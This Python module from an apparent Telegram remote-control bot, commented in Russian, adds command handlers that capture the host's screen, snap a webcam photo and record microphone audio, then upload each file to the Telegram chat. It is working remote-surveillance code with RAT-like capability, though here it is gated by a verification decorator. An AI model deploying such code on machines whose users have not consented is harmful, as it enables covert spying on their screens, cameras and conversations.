import os
import asyncio
import cv2
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write 
from telethon import events, Button
from core.decorators import with_verify
from utils.helpers import safe_remove
from config import BASE_DIR

def register_surveillance(bot):
    @bot.on(events.NewMessage(func=lambda e: e.text == '📸 Скриншот'))
    @with_verify("Take Screenshot", dangerous=True)
    async def take_screen(event):
        # Проверяем количество мониторов
        try:
            from utils.screenshot import get_monitor_info, take_screenshot_optimized
            monitors = get_monitor_info()
            
            if len(monitors) > 1:
                # Если несколько мониторов - показываем выбор
                buttons = []
                buttons.append([Button.inline("🖥️ Все мониторы", b"screenshot_all")])
                
                for monitor in monitors:
                    buttons.append([
                        Button.inline(
                            f"🖥️ Монитор {monitor['index']} ({monitor['width']}x{monitor['height']})",
                            f"screenshot_{monitor['index']}".encode()
                        )
                    ])
                
                return await event.reply(
                    f"🖥️ **Выбор монитора для скриншота:**\n\n"
                    f"Обнаружено мониторов: {len(monitors)}",
                    buttons=buttons
                )
            else:
                # Один монитор - делаем скриншот сразу
                screen_path = os.path.join(BASE_DIR, 's.png')
                success = take_screenshot_optimized(screen_path, monitor=0, compress=True)
                
                if success:
                    await event.reply("📸 Снимок экрана:", file=screen_path)
                else:
                    # Fallback на pyautogui
                    pyautogui.screenshot(screen_path)
                    await event.reply("📸 Снимок экрана:", file=screen_path)
                
                safe_remove(screen_path)
                
        except ImportError:
            # Если модуль screenshot недоступен - используем pyautogui
            screen_path = os.path.join(BASE_DIR, 's.png')
            pyautogui.screenshot(screen_path)
            await event.reply("📸 Снимок экрана:", file=screen_path)
            safe_remove(screen_path)

    @bot.on(events.NewMessage(func=lambda e: e.text == '🎥 Веб-камера'))
    @with_verify("Take WebCam Photo", dangerous=True)
    async def take_cam(event):
        cam_path = os.path.join(BASE_DIR, 'c.jpg')
        
        def _snap():
            cap = None
            try:
                cap = cv2.VideoCapture(0)
                # ✅ ИСПРАВЛЕНО: Добавлен timeout для камеры
                cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Минимальный буфер
                
                # Прогрев камеры с таймаутом
                for _ in range(5): 
                    cap.read()
                
                ret, frame = cap.read()
                if ret and frame is not None: 
                    cv2.imwrite(cam_path, frame)
                    return True
                return False
            except Exception as e:
                import logging
                logging.getLogger(__name__).error(f"Camera error: {e}")
                return False
            finally:
                if cap is not None:
                    cap.release()

        # ✅ ОПТИМИЗАЦИЯ: Используем thread pool вместо to_thread
        msg = await event.reply("⏳ Включаю камеру...")
        
        try:
            # Таймаут 10 секунд для захвата камеры
            ok = await asyncio.wait_for(asyncio.to_thread(_snap), timeout=10.0)
            
            if ok: 
                await msg.delete()
                await event.reply("🎥 Кадр с веб-камеры:", file=cam_path)
            else:
                await msg.edit("❌ Ошибка камеры. Возможно, она отключена или занята другим приложением.")
        except asyncio.TimeoutError:
            await msg.edit("❌ Таймаут камеры (10 сек). Камера не отвечает или занята.")
        finally:
            safe_remove(cam_path)

    @bot.on(events.NewMessage(func=lambda e: e.text == '🎤 Запись (10 сек)' or e.text.startswith('/mic')))
    @with_verify("Record Microphone", dangerous=True)
    async def record_mic(event):
        import re
        sec = 10
        m = re.match(r'^/mic(?: (\d+))?$', event.text)
        if m and m.group(1):
            sec = int(m.group(1))
        
        # Защита от OOM — максимум 120 секунд
        if sec > 120:
            return await event.reply("❌ Слишком долго. Максимальное время записи — 120 секунд.")
            
        msg = await event.reply(f"🎤 Записываю {sec} сек...")
        fp = os.path.join(BASE_DIR, 'mic.wav')
        
        def _rec():
            try:
                info = sd.query_devices(kind='input')
                rate = int(info['default_samplerate'])
                channels = min(2, info['max_input_channels'])
                rec = sd.rec(int(sec*rate), samplerate=rate, channels=channels, dtype='int16')
                sd.wait()
                write(fp, rate, rec)
                return True
            except Exception:
                return False
        
        ok = await asyncio.to_thread(_rec)
        if ok:
            await msg.delete()
            await event.reply("🎤 Запись готова:", file=fp)
            safe_remove(fp)
        else:
            await msg.edit("❌ Ошибка микрофона (отключен или нет прав в Windows)")